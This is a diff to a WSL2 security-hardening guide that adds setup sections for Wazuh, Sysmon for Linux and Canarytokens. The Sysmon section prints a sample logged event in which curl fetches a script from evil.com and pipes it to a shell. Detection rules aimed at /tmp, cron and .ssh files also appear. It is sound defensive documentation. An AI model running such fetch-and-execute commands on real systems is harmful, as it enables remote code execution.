@@ -33,13 +33,16 @@ This guide documents every step to harden a fresh WSL2 instance. Run all command
 23. [Osquery (Endpoint Visibility)](#23-osquery-endpoint-visibility)
 24. [Zeek (Network Security Monitor)](#24-zeek-network-security-monitor)
 25. [YARA-X (Malware Pattern Matching)](#25-yara-x-malware-pattern-matching)
-26. [Pi-hole (Network-Level Ad/Tracker Blocking)](#26-pi-hole-network-level-adtracker-blocking)
-27. [WSL-Specific Hardening](#27-wsl-specific-hardening)
-28. [Verification Checklist](#28-verification-checklist)
-29. [Known WSL2 Limitations](#29-known-wsl2-limitations)
-30. [Log Sources Reference](#30-log-sources-reference)
-31. [Security Monitoring Script](#31-security-monitoring-script)
-32. [Useful Monitoring Commands](#32-useful-monitoring-commands)
+26. [Wazuh (SIEM / XDR)](#26-wazuh-siem--xdr)
+27. [Sysmon for Linux (System Monitor)](#27-sysmon-for-linux-system-monitor)
+28. [Canarytokens (Tripwire Honeytokens)](#28-canarytokens-tripwire-honeytokens)
+29. [Pi-hole (Network-Level Ad/Tracker Blocking)](#29-pi-hole-network-level-adtracker-blocking)
+30. [WSL-Specific Hardening](#30-wsl-specific-hardening)
+31. [Verification Checklist](#31-verification-checklist)
+32. [Known WSL2 Limitations](#32-known-wsl2-limitations)
+33. [Log Sources Reference](#33-log-sources-reference)
+34. [Security Monitoring Script](#34-security-monitoring-script)
+35. [Useful Monitoring Commands](#35-useful-monitoring-commands)
 
 ---
 
@@ -2111,7 +2114,409 @@ yr scan /opt/yara-rules/malware/ /path/to/scan/
 
 ---
 
-## 26. Pi-hole (Network-Level Ad/Tracker Blocking)
+## 26. Wazuh (SIEM / XDR)
+
+Wazuh is an open-source security platform that combines SIEM (Security Information and Event Management) and XDR (Extended Detection and Response). It collects logs from all your security tools, correlates events, detects threats, and provides a web dashboard for investigation. Think of it as the central nervous system that ties everything else together.
+
+### Why Wazuh
+
+Without Wazuh, each security tool logs independently — Falco writes to journald, CrowdSec to its own log, osquery to JSON files, Sysmon to syslog. You'd need to check each one manually. Wazuh ingests all of them, applies detection rules, and surfaces alerts in one place. It also adds its own capabilities: file integrity monitoring, vulnerability detection, compliance checking (PCI-DSS, HIPAA, CIS), and active response.
+
+### Architecture
+
+```
+┌──────────────────────────────────────────────┐
+│              Wazuh Dashboard (:9443)          │
+│     Web UI — alerts, dashboards, search       │
+└──────────────┬───────────────────────────────┘
+               │
+┌──────────────▼───────────────────────────────┐
+│          Wazuh Indexer (OpenSearch)            │
+│    Stores and indexes all security events      │
+└──────────────┬───────────────────────────────┘
+               │
+┌──────────────▼───────────────────────────────┐
+│          Wazuh Manager + Filebeat             │
+│  Collects logs, runs rules, generates alerts  │
+│  Monitors: syslog, Sysmon, osquery, FIM, etc. │
+└──────────────────────────────────────────────┘
+```
+
+For a single WSL2 instance, all three components run on the same machine (single-node deployment).
+
+### Installation
+
+```bash
+# Download install assistant and config
+curl -fsSO https://packages.wazuh.com/4.11/wazuh-install.sh
+curl -fsSO https://packages.wazuh.com/4.11/config.yml
+
+# Edit config.yml for single-node
+cat > config.yml << 'EOF'
+nodes:
+  indexer:
+    - name: wazuh-indexer
+      ip: "127.0.0.1"
+  server:
+    - name: wazuh-server
+      ip: "127.0.0.1"
+  dashboard:
+    - name: wazuh-dashboard
+      ip: "127.0.0.1"
+EOF
+
+# Generate certificates
+bash wazuh-install.sh --generate-config-files
+
+# Install components (each step takes a few minutes)
+bash wazuh-install.sh --wazuh-indexer wazuh-indexer
+bash wazuh-install.sh --start-cluster
+bash wazuh-install.sh --wazuh-server wazuh-server
+
+# Dashboard — use -p to pick a port that doesn't conflict with Pi-hole (443)
+bash wazuh-install.sh --wazuh-dashboard wazuh-dashboard -p 9443
+```
+
+### Access
+
+```
+URL:      https://127.0.0.1:9443
+User:     admin
+Password: (shown at end of install, saved in /root/.wazuh-credentials)
+```
+
+The password is also in the install tar:
+```bash
+tar -xf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt -O
+```
+
+### What Wazuh Monitors (out of the box)
+
+| Source | What it detects |
+|--------|----------------|
+| Syslog / auth.log | Brute force, failed logins, privilege escalation |
+| File integrity (FIM) | Changes to /etc, binaries, SSH keys, crontabs |
+| Vulnerability detection | CVEs in installed packages |
+| Sysmon for Linux | Process creation, network connections, file changes (see section 27) |
+| osquery results | Feeds osquery scheduled query results into Wazuh alerts |
+| Docker | Container events, image vulnerabilities |
+| Rootcheck | Rootkit detection, system anomalies |
+| CIS benchmarks | Compliance checks against CIS hardening standards |
+
+### Integrating Other Tools
+
+Wazuh can ingest logs from most tools in this guide:
+
+```bash
+# Add custom log sources to /var/ossec/etc/ossec.conf
+# Example: monitor OpenCanary honeypot log
+<localfile>
+  <log_format>json</log_format>
+  <location>/var/log/opencanary.log</location>
+</localfile>
+
+# Example: monitor CrowdSec decisions
+<localfile>
+  <log_format>syslog</log_format>
+  <location>/var/log/crowdsec.log</location>
+</localfile>
+
+# Example: monitor YARA scan results
+<localfile>
+  <log_format>syslog</log_format>
+  <location>/var/log/yara-scan.log</location>
+</localfile>
+```
+
+After editing, restart the manager:
+```bash
+systemctl restart wazuh-manager
+```
+
+### Key Services
+
+| Service | Port | Purpose |
+|---------|------|---------|
+| `wazuh-indexer` | 9200 | OpenSearch — stores events |
+| `wazuh-manager` | 1514, 1515, 55000 | Agent communication, API |
+| `wazuh-dashboard` | 9443 | Web UI |
+| `filebeat` | — | Ships logs from manager to indexer |
+
+### Key Files
+
+| File | Purpose |
+|------|---------|
+| `/var/ossec/etc/ossec.conf` | Manager configuration (log sources, rules, FIM) |
+| `/var/ossec/logs/alerts/alerts.json` | Alert output in JSON |
+| `/var/ossec/logs/ossec.log` | Manager log |
+| `/var/ossec/ruleset/rules/` | Detection rules |
+| `/root/.wazuh-credentials` | Dashboard login credentials |
+
+### Verification
+
+```bash
+systemctl is-active wazuh-indexer
+systemctl is-active wazuh-manager
+systemctl is-active wazuh-dashboard
+systemctl is-active filebeat
+
+# Check manager is processing events
+tail -5 /var/ossec/logs/alerts/alerts.json | jq '.'
+
+# Check agent status (local agent)
+/var/ossec/bin/agent_control -l
+```
+
+### Resource Usage
+
+Wazuh is the heaviest tool in this guide. On a single-node deployment:
+
+- **RAM**: ~2-3 GB (indexer is the biggest consumer)
+- **Disk**: Grows with log volume; plan for 10-50 GB for the index
+- **CPU**: Low baseline, spikes during rule processing
+
+If resources are tight, you can stop the dashboard when not actively investigating and rely on the JSON alert log.
+
+---
+
+## 27. Sysmon for Linux (System Monitor)
+
+Sysmon for Linux is Microsoft's system monitoring tool, ported from the Windows version. It uses eBPF to trace process creation, network connections, and file operations at the kernel level, logging everything with SHA256 hashes, parent process chains, and user context. This is the same tool used by SOC teams on Windows — now available for Linux.
+
+### Why Sysmon
+
+Sysmon captures what happened, who did it, and how — at a level of detail no other tool provides. Every process creation includes the full command line, parent process, user, working directory, and file hash. This makes it invaluable for incident response: you can trace exactly how an attacker moved through the system.
+
+Combined with Wazuh, Sysmon events feed directly into the SIEM for correlation and alerting.
+
+### Installation
+
+```bash
+# Add Microsoft repository
+curl -fsSL https://packages.microsoft.com/keys/microsoft.asc \
+  | gpg --dearmor -o /etc/apt/trusted.gpg.d/microsoft.gpg
+echo "deb [arch=amd64] https://packages.microsoft.com/ubuntu/24.04/prod noble main" \
+  > /etc/apt/sources.list.d/microsoft-prod.list
+apt update && apt install -y sysmonforlinux
+```
+
+### Configuration
+
+Create a config file at `/etc/sysmon-config.xml`:
+
+```xml
+<Sysmon schemaversion="4.81">
+  <HashAlgorithms>SHA256</HashAlgorithms>
+  <EventFiltering>
+    <!-- Log all process creation except sysmon itself -->
+    <RuleGroup name="ProcessCreate" groupRelation="or">
+      <ProcessCreate onmatch="exclude">
+        <Image condition="end with">/sysmon</Image>
+      </ProcessCreate>
+    </RuleGroup>
+
+    <!-- File timestamp changes in temp directories -->
+    <RuleGroup name="FileCreateTime" groupRelation="or">
+      <FileCreateTime onmatch="include">
+        <TargetFilename condition="contains">/tmp/</TargetFilename>
+        <TargetFilename condition="contains">/dev/shm/</TargetFilename>
+      </FileCreateTime>
+    </RuleGroup>
+
+    <!-- Network connections (exclude DNS) -->
+    <RuleGroup name="NetworkConnect" groupRelation="or">
+      <NetworkConnect onmatch="exclude">
+        <DestinationPort condition="is">53</DestinationPort>
+      </NetworkConnect>
+    </RuleGroup>
+
+    <!-- Process termination from temp dirs -->
+    <RuleGroup name="ProcessTerminate" groupRelation="or">
+      <ProcessTerminate onmatch="include">
+        <Image condition="contains">/tmp/</Image>
+        <Image condition="contains">/dev/shm/</Image>
+      </ProcessTerminate>
+    </RuleGroup>
+
+    <!-- File creation in sensitive locations -->
+    <RuleGroup name="FileCreate" groupRelation="or">
+      <FileCreate onmatch="include">
+        <TargetFilename condition="contains">/tmp/</TargetFilename>
+        <TargetFilename condition="contains">/dev/shm/</TargetFilename>
+        <TargetFilename condition="contains">/etc/cron</TargetFilename>
+        <TargetFilename condition="contains">/etc/systemd/</TargetFilename>
+        <TargetFilename condition="contains">/.ssh/</TargetFilename>
+        <TargetFilename condition="end with">.sh</TargetFilename>
+        <TargetFilename condition="end with">.elf</TargetFilename>
+      </FileCreate>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
+
+### Start Sysmon
+
+```bash
+# Install config and start
+sysmon -accepteula -i /etc/sysmon-config.xml
+
+# Verify
+systemctl status sysmon
+```
+
+### Event Types
+
+| Event ID | Type | Description |
+|----------|------|-------------|
+| 1 | ProcessCreate | Process creation with full command line, hash, parent |
+| 3 | NetworkConnect | TCP/UDP connection with source/destination |
+| 5 | ProcessTerminate | Process exit |
+| 9 | RawAccessRead | Raw disk read (unusual = suspicious) |
+| 11 | FileCreate | File creation |
+| 23 | FileDelete | File deletion with archive |
+
+### Log Output
+
+Sysmon writes XML events to syslog. Each event includes:
+
+```
+Image:          /usr/bin/curl
+CommandLine:    curl -s https://evil.com/payload.sh
+User:           www-data
+ParentImage:    /usr/bin/bash
+ParentCommandLine: bash -c "curl ... | sh"
+Hashes:         SHA256=abc123...
+```
+
+### Viewing Events
+
+```bash
+# Recent process creation events
+grep 'sysmon.*EventID>1' /var/log/syslog | tail -5
+
+# Find specific command execution
+grep 'sysmon.*CommandLine.*curl' /var/log/syslog
+
+# Network connections
+grep 'sysmon.*EventID>3' /var/log/syslog | tail -10
+
+# File creation in sensitive directories
+grep 'sysmon.*EventID>11' /var/log/syslog | tail -10
+```
+
+### Wazuh Integration
+
+Wazuh has built-in Sysmon for Linux support. It automatically parses Sysmon XML events from syslog and applies detection rules. No additional configuration needed — once both are installed, Sysmon events appear in the Wazuh dashboard under the agent's events.
+
+### Key Files
+
+| File | Purpose |
+|------|---------|
+| `/etc/sysmon-config.xml` | Sysmon configuration (what to log) |
+| `/opt/sysmon/sysmon` | Sysmon binary |
+| `/var/log/syslog` | Sysmon events (XML in syslog) |
+
+### Updating Config
+
+```bash
+# Update running config without restart
+sysmon -c /etc/sysmon-config.xml
+```
+
+---
+
+## 28. Canarytokens (Tripwire Honeytokens)
+
+Canarytokens are digital tripwires — fake files, credentials, or URLs that alert you when someone accesses them. Unlike OpenCanary (which creates fake network services), canarytokens detect **post-exploitation activity**: an attacker who is already inside and browsing files, testing credentials, or exfiltrating data.
+
+### How It Works
+
+```
+You place a canarytoken (fake AWS key, fake document, fake URL)
+     ↓
+Attacker finds it during lateral movement / browsing
+     ↓
+Attacker uses/opens it → triggers callback to canarytokens.org
+     ↓
+You get an email alert with the attacker's IP, timestamp, and context
+```
+
+**Zero false positives** — legitimate users have no reason to touch these fake artifacts.
+
+### Using Canarytokens (Free Hosted)
+
+The easiest approach is the free hosted service at **canarytokens.org** — no infrastructure to run.
+
+1. Go to **https://canarytokens.org**
+2. Select a token type
+3. Enter your alert email
+4. Add a reminder note (e.g., "Fake AWS key in /root/.aws")
+5. Download/copy the token
+6. Place it where an attacker would look
+
+### Token Types and Placement
+
+| Token Type | What it does | Where to place |
+|-----------|-------------|---------------|
+| **AWS Keys** | Fake AWS access key + secret key | `~/.aws/credentials`, `.env` files, git repos |
+| **Web Bug / URL** | Invisible image that phones home when loaded | Paste in internal docs, wikis, email footers |
+| **DNS** | Resolves a unique hostname (alerts on lookup) | Config files, scripts, internal DNS records |
+| **Microsoft Word/Excel** | Document that phones home when opened | Shared drives: `passwords.xlsx`, `salary.docx` |
+| **PDF** | PDF that phones home when opened | `~/Documents/vpn-credentials.pdf` |
+| **Cloned Website** | Detects if someone clones your login page | N/A (monitors your domain) |
+| **MySQL** | Fake database dump that triggers on import | `~/backups/production-dump.sql` |
+| **WireGuard** | Fake VPN config | `~/vpn-config.conf` |
+| **Kubernetes** | Fake kubeconfig | `~/.kube/config-backup` |
+
+### Recommended Placements
+
+```bash
+# Fake AWS credentials (high-value target for attackers)
+mkdir -p /root/.aws
+cat > /root/.aws/credentials-backup << 'EOF'
+[production]
+aws_access_key_id = AKIA...  # paste canarytoken AWS key
+aws_secret_access_key = ...   # paste canarytoken secret
+EOF
+chmod 600 /root/.aws/credentials-backup
+
+# Fake password file (irresistible to attackers)
+cat > /root/Documents/passwords.txt << 'EOF'
+=== PRODUCTION CREDENTIALS ===
+Database: admin / [canarytoken URL embedded]
+VPN: see vpn-config.conf
+AWS Console: https://[canarytoken-url]
+EOF
+
+# Fake .env file in a project directory
+cat > /root/projects/.env.production.bak << 'EOF'
+DATABASE_URL=postgres://admin:hunter2@[canarytoken-dns]:5432/prod
+STRIPE_SECRET_KEY=sk_live_[canarytoken-url]
+EOF
+```
+
+### OpenCanary vs Canarytokens
+
+| | OpenCanary | Canarytokens |
+|---|---|---|
+| **Detects** | Network reconnaissance | Data access, credential theft |
+| **Layer** | Network (ports/services) | Filesystem / application |
+| **Signal** | "Someone is scanning" | "Someone is reading sensitive files" |
+| **Together** | Full kill chain coverage: scanning → access → exfiltration |
+
+Both should be used together for defense in depth.
+
+### Key Points
+
+- **Free** — canarytokens.org requires no signup, no payment
+- **No infrastructure** — no Docker, no servers, just place files
+- **High signal** — any trigger is a real investigation-worthy event
+- **Refresh periodically** — if tokens don't trigger for months, verify they still work
+- **Document placements** — keep a private record of where you placed tokens so you can update them
+
+---
+
+## 29. Pi-hole (Network-Level Ad/Tracker Blocking)
 
 Pi-hole acts as a DNS sinkhole, blocking ads, trackers, and malicious domains at the network level before they reach any application. It also provides a query log and web dashboard for DNS visibility.
 
@@ -2389,7 +2794,7 @@ Total: **~1,038,531 unique blocked domains**.
 
 ---
 
-## 27. WSL-Specific Hardening
+## 30. WSL-Specific Hardening
 
 ### Tighten Windows drive mount permissions
 
@@ -2450,7 +2855,7 @@ kernelCommandLine = apparmor=1 security=apparmor
 
 ---
 
-## 28. Verification Checklist
+## 31. Verification Checklist
 
 Run these after a fresh `wsl --shutdown` and reopen to confirm everything is working:
 
@@ -2548,6 +2953,15 @@ echo "=== YARA-X ==="
 yr --version 2>/dev/null || echo "yara-x: not installed"
 ls /etc/yara-rules/*.yar 2>/dev/null && echo "rules: present" || echo "rules: missing"
 
+echo "=== Wazuh ==="
+systemctl is-active wazuh-indexer 2>/dev/null && echo "indexer: active" || echo "indexer: not running"
+systemctl is-active wazuh-manager 2>/dev/null && echo "manager: active" || echo "manager: not running"
+systemctl is-active wazuh-dashboard 2>/dev/null && echo "dashboard: active" || echo "dashboard: not running"
+systemctl is-active filebeat 2>/dev/null && echo "filebeat: active" || echo "filebeat: not running"
+
+echo "=== Sysmon ==="
+systemctl is-active sysmon 2>/dev/null && echo "sysmon: active" || echo "sysmon: not running"
+
 echo "=== Pi-hole ==="
 pihole status 2>/dev/null || echo "Pi-hole not installed"
 dig @127.0.0.1 ads.doubleclick.net +short 2>/dev/null | head -1
@@ -2561,7 +2975,7 @@ ss -tlnp
 
 ---
 
-## 29. Known WSL2 Limitations
+## 32. Known WSL2 Limitations
 
 ### auditd does not work
 
@@ -2591,7 +3005,7 @@ The WSL2 kernel is shared with Windows. Certain sysctl keys may return `permissi
 
 ---
 
-## 30. Log Sources Reference
+## 33. Log Sources Reference
 
 Complete inventory of log sources on this WSL2 system and what to look for in each.
 
@@ -2735,6 +3149,9 @@ Complete inventory of log sources on this WSL2 system and what to look for in ea
 | `/opt/zeek/logs/current/ssl.log` | TSV | TLS connections and certificate validation |
 | `/opt/zeek/logs/current/notice.log` | TSV | Zeek-generated security alerts |
 | `/var/log/yara-scan.log` | text | YARA-X malware scan results |
+| `/var/ossec/logs/alerts/alerts.json` | JSON | Wazuh alerts — correlated security events |
+| `/var/ossec/logs/ossec.log` | text | Wazuh manager operational log |
+| `/var/log/syslog` (Sysmon events) | XML | Process creation, network connections, file changes with hashes |
 
 **Suspicious indicators:**
 - **Lynis**: Hardening index dropping between scans (something was weakened)
@@ -2747,6 +3164,8 @@ Complete inventory of log sources on this WSL2 system and what to look for in ea
 - **Osquery**: New listening ports, processes from unusual paths, new authorized_keys entries, LD_PRELOAD set
 - **Zeek**: Connections to known-bad IPs, DNS queries for suspicious domains, SSL certificate errors, large data transfers
 - **YARA-X**: Any match on crypto miner, webshell, or reverse shell rules
+- **Wazuh**: High-severity alerts (level 10+), FIM changes to /etc or binaries, failed auth clusters
+- **Sysmon**: Processes running from /tmp or /dev/shm, LD_PRELOAD in process env, unexpected network connections
 
 ### Systemd Journal (structured)
 
@@ -2758,7 +3177,7 @@ Complete inventory of log sources on this WSL2 system and what to look for in ea
 
 ---
 
-## 31. Security Monitoring Script
+## 34. Security Monitoring Script
 
 An automated monitoring script is installed at `/root/projects/security/scripts/security-monitor.sh`. It checks all log sources from Section 11 and produces a color-coded summary.
 
@@ -2779,7 +3198,7 @@ See the script source for details on all checks performed.
 
 ---
 
-## 32. Useful Monitoring Commands
+## 35. Useful Monitoring Commands
 
 ### Daily checks
 
@@ -2878,6 +3297,15 @@ cat /opt/zeek/logs/current/conn.log | zeek-cut id.orig_h | sort | uniq -c | sort
 
 # YARA-X — malware scanning
 yr scan /etc/yara-rules/suspicious.yar /tmp/ /dev/shm/ /var/tmp/
+
+# Wazuh — check recent alerts
+tail -20 /var/ossec/logs/alerts/alerts.json | jq '{rule: .rule.description, level: .rule.level, src: .srcip, agent: .agent.name}'
+/var/ossec/bin/agent_control -l  # list connected agents
+
+# Sysmon — process and network events
+grep 'sysmon.*EventID>1' /var/log/syslog | tail -5  # recent process creation
+grep 'sysmon.*EventID>3' /var/log/syslog | tail -5  # recent network connections
+grep 'sysmon.*CommandLine.*/tmp/' /var/log/syslog    # processes from temp dirs
 ```
 
 ---
